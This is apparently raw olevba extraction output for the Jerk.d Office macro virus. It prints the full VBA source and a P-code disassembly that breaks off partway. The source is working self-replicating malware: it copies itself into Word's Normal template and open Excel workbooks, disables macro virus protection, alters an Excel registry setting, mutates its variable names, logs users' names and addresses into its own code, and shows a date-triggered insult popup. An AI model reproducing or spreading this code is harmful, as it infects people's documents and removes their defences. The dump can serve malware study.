olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Jerk.d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSOffice.Jerk.d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
































Private Sub Workbook_Deactivate()
On Error Resume Next
Const YVIXS = 1, GFNSCPWSLWFIVI = True, PFUKLXCI = False, RZOCWYDF = 0
Dim XFAGVQDWHOWK, SFAFUUZLAPGUR As String
Dim JNRMNS, CBKQGW As Integer
Dim PWCMOEXEHWJJLOB As Boolean
SFAFUUZLAPGUR = "ThisWorkbook"
XFAGVQDWHOWK = Application.ThisWorkbook.VBProject.VBComponents.Item(YVIXS).CodeModule.Lines(1, Application.ThisWorkbook.VBProject.VBComponents.Item(YVIXS).CodeModule.CountOfLines)
Call TDHCILMMQIQXCCE(XFAGVQDWHOWK)
For JNRMNS = YVIXS To Application.Workbooks.Count
PWCMOEXEHWJJLOB = PFUKLXCI
For CBKQGW = YVIXS To Application.Workbooks.Item(JNRMNS).VBProject.VBComponents.Count
If Application.Workbooks.Item(JNRMNS).VBProject.VBComponents.Item(CBKQGW).CodeModule.CountOfLines = RZOCWYDF Then
If Application.Workbooks.Item(JNRMNS).Path <> "" And Application.Workbooks.Item(JNRMNS).Saved = GFNSCPWSLWFIVI And PWCMOEXEHWJJLOB = PFUKLXCI Then PWCMOEXEHWJJLOB = GFNSCPWSLWFIVI
Application.Workbooks.Item(JNRMNS).VBProject.VBComponents.Item(CBKQGW).CodeModule.InsertLines YVIXS, XFAGVQDWHOWK
If Application.Workbooks.Item(JNRMNS).VBProject.VBComponents.Item(CBKQGW).Name = SFAFUUZLAPGUR Then
Application.Workbooks.Item(JNRMNS).VBProject.VBComponents.Item(CBKQGW).CodeModule.ReplaceLine YVIXS * 33, "Private Sub Workbook_Deactivate()"
Else
Application.Workbooks.Item(JNRMNS).VBProject.VBComponents.Item(CBKQGW).CodeModule.ReplaceLine YVIXS * 33, "Private Sub Worksheet_Deactivate()"
End If
End If
Next CBKQGW
If PWCMOEXEHWJJLOB = GFNSCPWSLWFIVI Then Application.Workbooks.Item(JNRMNS).Save
Next JNRMNS
End Sub
Private Sub Document_Close()
On Error Resume Next
Const GFNSCPWSLWFIVI = True, PFUKLXCI = False, RZOCWYDF = 0, YVIXS = 1, RQDRJVU = wdFormatDocument, TJRJUPY = wdFormatTemplate, WOXRLNGIR = ":"
Dim PWCMOEXEHWJJLOB, JVNFGNO, VEVXXS, DRLAPPGEYHXACC As Boolean
Dim EFDWG, NMGFZIGAPVE As Object
Dim PFJIAJDOSZGUP, XFAGVQDWHOWK As String
If Month(YVIXS * Now) > YVIXS * 2 + YVIXS * 3 And Day(YVIXS * Now) = 4 + YVIXS * 10 Then MsgBox "V guvax " & Application.UserName & " vf n ovt fghcvq wrex!", 0, "www.all.net"
Set EFDWG = ActiveDocument.VBProject.VBComponents.Item(YVIXS)
Set NMGFZIGAPVE = NormalTemplate.VBProject.VBComponents.Item(YVIXS)
Randomize
VEVXXS = PFUKLXCI
DRLAPPGEYHXACC = PFUKLXCI
If EFDWG.CodeModule.CountOfLines <> RZOCWYDF Then VEVXXS = GFNSCPWSLWFIVI
If NMGFZIGAPVE.CodeModule.CountOfLines <> RZOCWYDF Then DRLAPPGEYHXACC = GFNSCPWSLWFIVI
Options.VirusProtection = PFUKLXCI
If (VEVXXS = GFNSCPWSLWFIVI Xor DRLAPPGEYHXACC = GFNSCPWSLWFIVI) And (ActiveDocument.SaveFormat = RQDRJVU Or ActiveDocument.SaveFormat = TJRJUPY) Then
If VEVXXS = GFNSCPWSLWFIVI Then
JVNFGNO = NormalTemplate.Saved
XFAGVQDWHOWK = EFDWG.CodeModule.Lines(YVIXS, EFDWG.CodeModule.CountOfLines)
Call RKCNGS(XFAGVQDWHOWK)
If Int(Rnd * 10 * YVIXS) = YVIXS * 7 Then Call JPPFNH(XFAGVQDWHOWK)
Call FWXSYE(XFAGVQDWHOWK)
NMGFZIGAPVE.CodeModule.InsertLines YVIXS, XFAGVQDWHOWK
If JVNFGNO = GFNSCPWSLWFIVI Then NormalTemplate.Save
End If
PFJIAJDOSZGUP = Mid(ActiveDocument.FullName, 2, YVIXS)
If DRLAPPGEYHXACC = GFNSCPWSLWFIVI And (PFJIAJDOSZGUP = WOXRLNGIR Or ActiveDocument.Saved = PFUKLXCI) Then
PWCMOEXEHWJJLOB = ActiveDocument.Saved
XFAGVQDWHOWK = NMGFZIGAPVE.CodeModule.Lines(YVIXS, NMGFZIGAPVE.CodeModule.CountOfLines)
Call FWXSYE(XFAGVQDWHOWK)
EFDWG.CodeModule.InsertLines YVIXS, XFAGVQDWHOWK
If PWCMOEXEHWJJLOB = GFNSCPWSLWFIVI Then ActiveDocument.Save
End If
End If
End Sub
Private Sub JPPFNH(ByRef XFAGVQDWHOWK As String)
On Error Resume Next
Const BNFFMRZQDUKZL = 48, HRDFFLIFPL = 15, KDWECJJ = 5, BQGSSGXM = 65, AGSKWWUMTZDP = 90, YVIXS = 1, GFNSCPWSLWFIVI = True, PFUKLXCI = False
Dim QUBCASHQVGAUS, OFAYBMKQUTmp, XTVXIWR, OFAYBMKQU(YVIXS To BNFFMRZQDUKZL), OFAYBMKQU2(YVIXS To BNFFMRZQDUKZL) As String
Dim JNRMNS, CBKQGW, EYWGRQMP As Integer
Dim JJUFCNQDGK As Boolean
QUBCASHQVGAUS = "XFAGVQDWHOWK BNFFMRZQDUKZL OFAYBMKQU OFAYBMKQU2 XTVXIWR JNRMNS CBKQGW EYWGRQMP JJUFCNQDGK JPPFNH HRDFFLIFPL KDWECJJ BQGSSGXM AGSKWWUMTZDP YVIXS QUBCASHQVGAUS OFAYBMKQUTmp PWCMOEXEHWJJLOB JVNFGNO VEVXXS DRLAPPGEYHXACC EFDWG NMGFZIGAPVE RKCNGS TKXACEQEWK TYEOXRHKCZXGU RRONBZRHQUP CTVSEIGJTDI TKXACEQEWKTmp BSCSSNLMEA BQNVZMMODB PFJIAJDOSZGUP GFNSCPWSLWFIVI PFUKLXCI RZOCWYDF RQDRJVU TJRJUPY HXTMDEVREJQNGOD JENPKIOAQRVUXEM WOXRLNGIR IWRVWLXNQN FJBCNOTRBLSZ SFAFUUZLAPGUR TDHCILMMQIQXCCE FWXSYE FRNLIBJWNMKHY XDLVNVWH XSBJJWF"
Randomize
CBKQGW = YVIXS
For JNRMNS = YVIXS To Len(QUBCASHQVGAUS)
If Mid(QUBCASHQVGAUS, JNRMNS, YVIXS) = " " Or JNRMNS = Len(QUBCASHQVGAUS) Then
If JNRMNS = Len(QUBCASHQVGAUS) Then OFAYBMKQUTmp = OFAYBMKQUTmp & Mid(QUBCASHQVGAUS, JNRMNS, YVIXS)
For EYWGRQMP = YVIXS To Int((HRDFFLIFPL - KDWECJJ + YVIXS) * Rnd + KDWECJJ)
OFAYBMKQU2(CBKQGW) = OFAYBMKQU2(CBKQGW) & Chr(Int((AGSKWWUMTZDP - BQGSSGXM + YVIXS) * Rnd + BQGSSGXM))
Next EYWGRQMP
OFAYBMKQU(CBKQGW) = OFAYBMKQUTmp
OFAYBMKQUTmp = ""
CBKQGW = CBKQGW + YVIXS
Else
OFAYBMKQUTmp = OFAYBMKQUTmp & Mid(QUBCASHQVGAUS, JNRMNS, YVIXS)
End If
Next JNRMNS
JJUFCNQDGK = PFUKLXCI
For JNRMNS = YVIXS To Len(XFAGVQDWHOWK)
For CBKQGW = YVIXS To BNFFMRZQDUKZL
If Mid(XFAGVQDWHOWK, JNRMNS, Len(OFAYBMKQU(CBKQGW))) = OFAYBMKQU(CBKQGW) Then
XTVXIWR = XTVXIWR & OFAYBMKQU2(CBKQGW)
JNRMNS = JNRMNS + Len(OFAYBMKQU(CBKQGW)) - YVIXS
JJUFCNQDGK = GFNSCPWSLWFIVI
Exit For
End If
Next CBKQGW
If JJUFCNQDGK = PFUKLXCI Then
XTVXIWR = XTVXIWR & Mid(XFAGVQDWHOWK, JNRMNS, YVIXS)
Else
JJUFCNQDGK = PFUKLXCI
End If
Next JNRMNS
XFAGVQDWHOWK = XTVXIWR
End Sub
Private Sub RKCNGS(ByRef XFAGVQDWHOWK As String)
On Error Resume Next
Const CTVSEIGJTDI = "' ", YVIXS = 1
Const HXTMDEVREJQNGOD = "hh:mm:ss: AMPM - ", JENPKIOAQRVUXEM = "dddd, d mmm yyyy"
Dim TKXACEQEWKTmp, TKXACEQEWK, BSCSSNLMEA, BQNVZMMODB, TYEOXRHKCZXGU, RRONBZRHQUP As String
Dim JNRMNS As Integer
TYEOXRHKCZXGU = Chr(10 * YVIXS + 3)
TKXACEQEWK = Application.UserAddress
BQNVZMMODB = Format(Time, HXTMDEVREJQNGOD) & Format(Date, JENPKIOAQRVUXEM)
RRONBZRHQUP = Chr(YVIXS * 10)
BSCSSNLMEA = Application.UserName
For JNRMNS = YVIXS To Len(TKXACEQEWK)
If Mid(TKXACEQEWK, JNRMNS, YVIXS) <> TYEOXRHKCZXGU Then
If Mid(TKXACEQEWK, JNRMNS, YVIXS) <> RRONBZRHQUP Then
TKXACEQEWKTmp = TKXACEQEWKTmp & Mid(TKXACEQEWK, JNRMNS, YVIXS)
End If
Else
TKXACEQEWKTmp = TKXACEQEWKTmp & TYEOXRHKCZXGU & CTVSEIGJTDI
End If
Next JNRMNS
XFAGVQDWHOWK = XFAGVQDWHOWK & TYEOXRHKCZXGU & CTVSEIGJTDI & BQNVZMMODB & TYEOXRHKCZXGU & CTVSEIGJTDI & BSCSSNLMEA & TYEOXRHKCZXGU & CTVSEIGJTDI & TKXACEQEWK & TYEOXRHKCZXGU
End Sub
Private Sub FWXSYE(ByVal XFAGVQDWHOWK As String)
On Error Resume Next
Dim XSBJJWF As Long
Dim IWRVWLXNQN As Object
Dim FRNLIBJWNMKHY, XDLVNVWH As String
FRNLIBJWNMKHY = "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel"
XSBJJWF = &H0
XDLVNVWH = "Options6"
System.PrivateProfileString("", FRNLIBJWNMKHY, XDLVNVWH) = XSBJJWF
Set IWRVWLXNQN = GetObject(, "Excel.Application")
Const YVIXS = 1, RZOCWYDF = 0
Dim SFAFUUZLAPGUR As String
Dim JNRMNS, CBKQGW As Integer
SFAFUUZLAPGUR = "ThisWorkbook"
For JNRMNS = YVIXS To IWRVWLXNQN.Application.Workbooks.Count
For CBKQGW = YVIXS To IWRVWLXNQN.Application.Workbooks.Item(JNRMNS).VBProject.VBComponents.Count
If IWRVWLXNQN.Application.Workbooks.Item(JNRMNS).VBProject.VBComponents.Item(CBKQGW).CodeModule.CountOfLines = RZOCWYDF Then
IWRVWLXNQN.Application.Workbooks.Item(JNRMNS).VBProject.VBComponents.Item(CBKQGW).CodeModule.InsertLines YVIXS, XFAGVQDWHOWK
If IWRVWLXNQN.Application.Workbooks.Item(JNRMNS).VBProject.VBComponents.Item(CBKQGW).Name = SFAFUUZLAPGUR Then
IWRVWLXNQN.Application.Workbooks.Item(JNRMNS).VBProject.VBComponents.Item(CBKQGW).CodeModule.ReplaceLine 33 * YVIXS, "Private Sub Workbook_Deactivate()"
Else
IWRVWLXNQN.Application.Workbooks.Item(JNRMNS).VBProject.VBComponents.Item(CBKQGW).CodeModule.ReplaceLine YVIXS * 33, "Private Sub Worksheet_Deactivate()"
End If
End If
Next CBKQGW
Next JNRMNS
Set IWRVWLXNQN = Nothing
End Sub
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'

' 05:50:07:  - tiistai, 23 helmi 1999
' Taloustieteellinen osasto
'

' 08:31:13:  - maanantai, 1 maalis 1999
' Taloustieteellinen osasto
'

' 04:45:45:  - keskiviikko, 3 maalis 1999
' Pohjola
'

' 04:22:45:  - tiistai, 27 huhti 1999
' DF
'

' 09:37:21:  - miðvikudagur, 28 apr 1999
' Vesselin Vladimirov Bontchev
'

' 10:04:46:  - miðvikudagur, 28 apr 1999
' Vesselin Vladimirov Bontchev
'

' 03:03:45: PM - Tuesday, 10 Oct 2000
' Harry H.
'

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSOffice.Jerk.d
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 15007 bytes
' Line #0:
' Line #1:
' Line #2:
' Line #3:
' Line #4:
' Line #5:
' Line #6:
' Line #7:
' Line #8:
' Line #9:
' Line #10:
' Line #11:
' Line #12:
' Line #13:
' Line #14:
' Line #15:
' Line #16:
' Line #17:
' Line #18:
' Line #19:
' Line #20:
' Line #21:
' Line #22:
' Line #23:
' Line #24:
' Line #25:
' Line #26:
' Line #27:
' Line #28:
' Line #29:
' Line #30:
' Line #31:
' Line #32:
' 	FuncDefn (Private Sub Workbook_Deactivate())
' Line #33:
' 	OnError (Resume Next) 
' Line #34:
' 	Dim (Const) 
' 	LitDI2 0x0001 
' 	VarDefn YVIXS
' 	LitVarSpecial (True)
' 	VarDefn GFNSCPWSLWFIVI
' 	LitVarSpecial (False)
' 	VarDefn PFUKLXCI
' 	LitDI2 0x0000 
' 	VarDefn RZOCWYDF
' Line #35:
' 	Dim 
' 	VarDefn XFAGVQDWHOWK
' 	VarDefn SFAFUUZLAPGUR (As String)
' Line #36:
' 	Dim 
' 	VarDefn JNRMNS
' 	VarDefn CBKQGW (As Integer)
' Line #37:
' 	Dim 
' 	VarDefn PWCMOEXEHWJJLOB (As Boolean)
' Line #38:
' 	LitStr 0x000C "ThisWorkbook"
' 	St SFAFUUZLAPGUR 
' Line #39:
' 	LitDI2 0x0001 
' 	Ld YVIXS 
' 	Ld Application 
' 	MemLd ThisWorkbook 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld YVIXS 
' 	Ld Application 
' 	MemLd ThisWorkbook 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St XFAGVQDWHOWK 
' Line #40:
' 	Ld XFAGVQDWHOWK 
' 	ArgsCall (Call) TDHCILMMQIQXCCE 0x0001 
' Line #41:
' 	StartForVariable 
' 	Ld JNRMNS 
' 	EndForVariable 
' 	Ld YVIXS 
' 	Ld Application 
' 	MemLd Workbooks 
' 	MemLd Count 
' 	For 
' Line #42:
' 	Ld PFUKLXCI 
' 	St PWCMOEXEHWJJLOB 
' Line #43:
' 	StartForVariable 
' 	Ld CBKQGW 
' 	EndForVariable 
' 	Ld YVIXS 
' 	Ld JNRMNS 
' 	Ld Application 
' 	MemLd Workbooks 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #44:
' 	Ld CBKQGW 
' 	Ld JNRMNS 
' 	Ld Application 
' 	MemLd Workbooks 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld RZOCWYDF 
' 	Eq 
' 	IfBlock 
' Line #45:
' 	Ld JNRMNS 
' 	Ld Application 
' 	MemLd Workbooks 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Path 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Ld JNRMNS 
' 	Ld Application 
' 	MemLd Workbooks 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Saved 
' 	Ld GFNSCPWSLWFIVI 
' 	Eq 
' 	And 
' 	Ld PWCMOEXEHWJJLOB 
' 	Ld PFUKLXCI 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld GFNSCPWSLWFIVI 
' 	St PWCMOEXEHWJJLOB 
' 	EndIf 
' Line #46:
' 	Ld YVIXS 
' 	Ld XFAGVQDWHOWK 
' 	Ld CBKQGW 
' 	Ld JNRMNS 
' 	Ld Application 
' 	MemLd Workbooks 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #47:
' 	Ld CBKQGW 
' 	Ld JNRMNS 
' 	Ld Application 
' 	MemLd Workbooks 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	Ld SFAFUUZLAPGUR 
' 	Eq 
' 	IfBlock 
' Line #48:
' 	Ld YVIXS 
' 	LitDI2 0x0021 
' 	Mul 
' 	LitStr 0x0021 "Private Sub Workbook_Deactivate()"
' 	Ld CBKQGW 
' 	Ld JNRMNS 
' 	Ld Application 
' 	MemLd Workbooks 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #49:
' 	ElseBlock 
' Line #50:
' 	Ld YVIXS 
' 	LitDI2 0x0021 
' 	Mul 
' 	LitStr 0x0022 "Private Sub Worksheet_Deactivate()"
' 	Ld CBKQGW 
' 	Ld JNRMNS 
' 	Ld Application 
' 	MemLd Workbooks 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #51:
' 	EndIfBlock 
' Line #52:
' 	EndIfBlock 
' Line #53:
' 	StartForVariable 
' 	Ld CBKQGW 
' 	EndForVariable 
' 	NextVar 
' Line #54:
' 	Ld PWCMOEXEHWJJLOB 
' 	Ld GFNSCPWSLWFIVI 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld JNRMNS 
' 	Ld Application 
' 	MemLd Workbooks 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #55:
' 	StartForVariable 
' 	Ld JNRMNS 
' 	EndForVariable 
' 	NextVar 
' Line #56:
' 	EndSub 
' Line #57:
' 	FuncDefn (Private Sub Document_Close())
' Line #58:
' 	OnError (Resume Next) 
' Line #59:
' 	Dim (Const) 
' 	LitVarSpecial (True)
' 	VarDefn GFNSCPWSLWFIVI
' 	LitVarSpecial (False)
' 	VarDefn PFUKLXCI
' 	LitDI2 0x0000 
' 	VarDefn RZOCWYDF
' 	LitDI2 0x0001 
' 	VarDefn YVIXS
' 	Ld wdFormatDocument 
' 	VarDefn RQDRJVU
' 	Ld wdFormatTemplate 
' 	VarDefn TJRJUPY
' 	LitStr 0x0001 ":"
' 	VarDefn WOXRLNGIR
' Line #60:
' 	Dim 
' 	VarDefn PWCMOEXEHWJJLOB
' 	VarDefn JVNFGNO
' 	VarDefn VEVXXS
' 	VarDefn DRLAPPGEYHXACC (As Boolean)
' Line #61:
' 	Dim 
' 	VarDefn EFDWG
' 	VarDefn NMGFZIGAPVE (As Object)
' Line #62:
' 	Dim 
' 	VarDefn PFJIAJDOSZGUP
' 	VarDefn XFAGVQDWHOWK (As String)
' Line #63:
' 	Ld YVIXS 
' 	Ld Now 
' 	Mul 
' 	ArgsLd Month 0x0001 
' 	Ld YVIXS 
' 	LitDI2 0x0002 
' 	Mul 
' 	Ld YVIXS 
' 	LitDI2 0x0003 
' 	Mul 
' 	Add 
' 	Gt 
' 	Ld YVIXS 
' 	Ld Now 
' 	Mul 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0004 
' 	Ld YVIXS 
' 	LitDI2 0x000A 
' 	Mul 
' 	Add 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0008 "V guvax "
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitStr 0x0016 " vf n ovt fghcvq wrex!"
' 	Concat 
' 	LitDI2 0x0000 
' 	LitStr 0x000B "www.all.net"
' 	ArgsCall MsgBox 0x0003 
' 	EndIf 
' Line #64:
' 	SetStmt 
' 	Ld YVIXS 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set EFDWG 
' Line #65:
' 	SetStmt 
' 	Ld YVIXS 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set NMGFZIGAPVE 
' Line #66:
' 	ArgsCall Read 0x0000 
' Line #67:
' 	Ld PFUKLXCI 
' 	St VEVXXS 
' Line #68:
' 	Ld PFUKLXCI 
' 	St DRLAPPGEYHXACC 
' Line #69:
' 	Ld EFDWG 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld RZOCWYDF 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld GFNSCPWSLWFIVI 
' 	St VEVXXS 
' 	EndIf 
' Line #70:
' 	Ld NMGFZIGAPVE 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld RZOCWYDF 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld GFNSCPWSLWFIVI 
' 	St DRLAPPGEYHXACC 
' 	EndIf 
' Line #71:
' 	Ld PFUKLXCI 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #72:
' 	Ld VEVXXS 
' 	Ld GFNSCPWSLWFIVI 
' 	Eq 
' 	Ld DRLAPPGEYHXACC 
' 	Ld GFNSCPWSLWFIVI 
' 	Eq 
' 	Xor 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld RQDRJVU 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld TJRJUPY 
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #73:
' 	Ld VEVXXS 
' 	Ld GFNSCPWSLWFIVI 
' 	Eq 
' 	IfBlock 
' Line #74:
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	St JVNFGNO 
' Line #75:
' 	Ld YVIXS 
' 	Ld EFDWG 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld EFDWG 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St XFAGVQDWHOWK 
' Line #76:
' 	Ld XFAGVQDWHOWK 
' 	ArgsCall (Call) RKCNGS 0x0001 
' Line #77:
' 	Ld Rnd 
' 	LitDI2 0x000A 
' 	Mul 
' 	Ld YVIXS 
' 	Mul 
' 	FnInt 
' 	Ld YVIXS 
' 	LitDI2 0x0007 
' 	Mul 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld XFAGVQDWHOWK 
' 	ArgsCall (Call) JPPFNH 0x0001 
' 	EndIf 
' Line #78:
' 	Ld XFAGVQDWHOWK 
' 	ArgsCall (Call) FWXSYE 0x0001 
' Line #79:
' 	Ld YVIXS 
' 	Ld XFAGVQDWHOWK 
' 	Ld NMGFZIGAPVE 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #80:
' 	Ld JVNFGNO 
' 	Ld GFNSCPWSLWFIVI 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #81:
' 	EndIfBlock 
' Line #82:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0002 
' 	Ld YVIXS 
' 	ArgsLd Mid$ 0x0003 
' 	St PFJIAJDOSZGUP 
' Line #83:
' 	Ld DRLAPPGEYHXACC 
' 	Ld GFNSCPWSLWFIVI 
' 	Eq 
' 	Ld PFJIAJDOSZGUP 
' 	Ld WOXRLNGIR 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	Ld PFUKLXCI 
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #84:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St PWCMOEXEHWJJLOB 
' Line #85:
' 	Ld YVIXS 
' 	Ld NMGFZIGAPVE 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld NMGFZIGAPVE 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St XFAGVQDWHOWK 
' Line #86:
' 	Ld XFAGVQDWHOWK 
' 	ArgsCall (Call) FWXSYE 0x0001 
' Line #87:
' 	Ld YVIXS 
' 	Ld XFAGVQDWHOWK 
' 	Ld EFDWG 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #88:
' 	Ld PWCMOEXEHWJJLOB 
' 	Ld GFNSCPWSLWFIVI 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #89:
' 	EndIfBlock 
' Line #90:
' 	EndIfBlock 
' Line #91:
' 	EndSub 
' Line #92:
' 	FuncDefn (Private Sub JPPFNH(ByRef XFAGVQDWHOWK As String))
' Line #93:
' 	OnError (Resume Next) 
' Line #94:
' 	Dim (Const) 
' 	LitDI2 0x0030 
' 	VarDefn BNFFMRZQDUKZL
' 	LitDI2 0x000F 
' 	VarDefn HRDFFLIFPL
' 	LitDI2 0x0005 
' 	VarDefn KDWECJJ
' 	LitDI2 0x0041 
' 	VarDefn BQGSSGXM
' 	LitDI2 0x005A 
' 	VarDefn AGSKWWUMTZDP
' 	LitDI2 0x0001 
' 	VarDefn YVIXS
' 	LitVarSpecial (True)
' 	VarDefn GFNSCPWSLWFIVI
' 	LitVarSpecial (False)
' 	VarDefn PFUKLXCI
' Line #95:
' 	Dim 
' 	VarDefn QUBCASHQVGAUS
' 	VarDefn OFAYBMKQUTmp
' 	VarDefn XTVXIWR
' 	Ld YVIXS 
' 	Ld BNFFMRZQDUKZL 
' 	VarDefn OFAYBMKQU
' 	Ld YVIXS 
' 	Ld BNFFMRZQDUKZL 
' 	VarDefn OFAYBMKQU2 (As String)
' Line #96:
' 	Dim 
' 	VarDefn JNRMNS
' 	VarDefn CBKQGW
' 	VarDefn EYWGRQMP (As Integer)
' Line #97:
' 	Dim 
' 	VarDefn JJUFCNQDGK (As Boolean)
' Line #98:
' 	LitStr 0x020B "XFAGVQDWHOWK BNFFMRZQDUKZL OFAYBMKQU OFAYBMKQU2 XTVXIWR JNRMNS CBKQGW EYWGRQMP JJUFCNQDGK JPPFNH HRDFFLIFPL KDWECJJ BQGSSGXM AGSKWWUMTZDP YVIXS QUBCASHQVGAUS OFAYBMKQUTmp PWCMOEXEHWJJLOB JVNFGNO VEVXXS DRLAPPGEYHXACC EFDWG NMGFZIGAPVE RKCNGS TKXACEQEWK TYEOXRHKCZXGU RRONBZRHQUP CTVSEIGJTDI TKXACEQEWKTmp BSCSSNLMEA BQNVZMMODB PFJIAJDOSZGUP GFNSCPWSLWFIVI PFUKLXCI RZOCWYDF RQDRJVU TJRJUPY HXTMDEVREJQNGOD JENPKIOAQRVUXEM WOXRLNGIR IWRVWLXNQN FJBCNOTRBLSZ SFAFUUZLAPGUR TDHCILMMQIQXCCE FWXSYE FRNLIBJWNMKHY XDLVNVWH XSBJJWF"
' 	St QUBCASHQVGAUS 
' Line #99:
' 	ArgsCall Read 0x0000 
' Line #100:
' 	Ld YVIXS 
' 	St CBKQGW 
' Line #101:
' 	StartForVariable 
' 	Ld JNRMNS 
' 	EndForVariable 
' 	Ld YVIXS 
' 	Ld QUBCASHQVGAUS 
' 	FnLen 
' 	For 
' Line #102:
' 	Ld QUBCASHQVGAUS 
' 	Ld JNRMNS 
' 	Ld YVIXS 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 " "
' 	Eq 
' 	Ld JNRMNS 
' 	Ld QUBCASHQVGAUS 
' 	FnLen 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #103:
' 	Ld JNRMNS 
' 	Ld QUBCASHQVGAUS 
' 	FnLen 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld OFAYBMKQUTmp 
' 	Ld QUBCASHQVGAUS 
' 	Ld JNRMNS 
' 	Ld YVIXS 
' 	ArgsLd Mid$ 0x0003 
' 	Concat 
' 	St OFAYBMKQUTmp 
' 	EndIf 
' Line #104:
' 	StartForVariable 
' 	Ld EYWGRQMP 
' 	EndForVariable 
' 	Ld YVIXS 
' 	Ld HRDFFLIFPL 
' 	Ld KDWECJJ 
' 	Sub 
' 	Ld YVIXS 
' 	Add 
' 	Paren 
' 	Ld Rnd 
' 	Mul 
' 	Ld KDWECJJ 
' 	Add 
' 	FnInt 
' 	For 
' Line #105:
' 	Ld CBKQGW 
' 	ArgsLd OFAYBMKQU2 0x0001 
' 	Ld AGSKWWUMTZDP 
' 	Ld BQGSSGXM 
' 	Sub 
' 	Ld YVIXS 
' 	Add 
' 	Paren 
' 	Ld Rnd 
' 	Mul 
' 	Ld BQGSSGXM 
' 	Add 
' 	FnInt 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld CBKQGW 
' 	ArgsSt OFAYBMKQU2 0x0001 
' Line #106:
' 	StartForVariable 
' 	Ld EYWGRQMP 
' 	EndForVariable 
' 	NextVar 
' Line #107:
' 	Ld OFAYBMKQUTmp 
' 	Ld CBKQGW 
' 	ArgsSt OFAYBMKQU 0x0001 
' Line #108:
' 	LitStr 0x0000 ""
' 	St OFAYBMKQUTmp 
' Line #109:
' 	Ld CBKQGW 
' 	Ld YVIXS 
